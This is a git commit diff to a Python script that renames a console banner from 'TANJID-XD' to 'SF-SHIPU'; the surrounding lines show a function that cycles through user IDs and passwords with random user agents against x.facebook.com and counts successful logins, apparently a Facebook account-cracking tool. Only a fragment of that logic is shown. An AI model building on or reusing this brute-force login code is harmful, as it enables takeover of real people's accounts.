3e9fc8051c7eeb6a8cd290b5e7f7b6c210cc84b3
shipukhan2001 <149859698+shipukhan2001@users.noreply.github.com>
2024-01-01 10:59:32 +0600

    Update S+F-LOVE.py

--- S+F-LOVE.py
+++ S+F-LOVE.py
@@ -211,7 +211,7 @@ def rcrack1(uid,pwx,tl):
             pro = random.choice(ugen)
             session = requests.Session()
             bi = random.choice([A,B,C,D,E,F,G,H])
-            sys.stdout.write(f'\r \033[1;31m[%sTANJID-XD\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45m[\033[38;5;42mOK-]\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;31m[%sSF-SHIPU\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45m[\033[38;5;42mOK-]\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
             free_fb = session.get('https://x.facebook.com').text
             log_data = {
